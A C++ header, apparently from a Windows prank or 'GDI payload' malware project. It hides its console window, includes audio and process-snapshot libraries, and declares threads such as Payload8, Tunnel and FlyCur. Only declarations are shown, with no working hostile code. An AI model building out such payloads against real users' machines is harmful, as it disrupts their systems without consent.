#pragma once

#include <Windows.h>
#include <math.h>
#include <string>
#include <iostream>
#include <string>
#include <Shlwapi.h>
#include <fstream>
#include <mmsystem.h>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <audioclient.h>
#include <tlhelp32.h>
#include"payloads.h"
#pragma comment(lib,"winmm.lib")
#pragma comment(lib,"Shlwapi.lib")
#pragma  comment(lib,"WinMM.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"	" )
using namespace std;
#define thread(name) DWORD WINAPI name(LPVOID lpParam)
#define rt(thrdname) CreateThread(NULL, 0, thrdname, NULL, 0, NULL);
DWORD WINAPI Sound(LPVOID lpParameter);
DWORD WINAPI CopyCur();
DWORD WINAPI _MSG(LPVOID lpParameter);
DWORD WINAPI Left();
DWORD WINAPI Tunnel();
DWORD WINAPI FlyCur(LPVOID lpParameter);
DWORD WINAPI Payload8(LPVOID lpParameter);
DWORD WINAPI Payload9();
DWORD WINAPI Down();
DWORD WINAPI G();
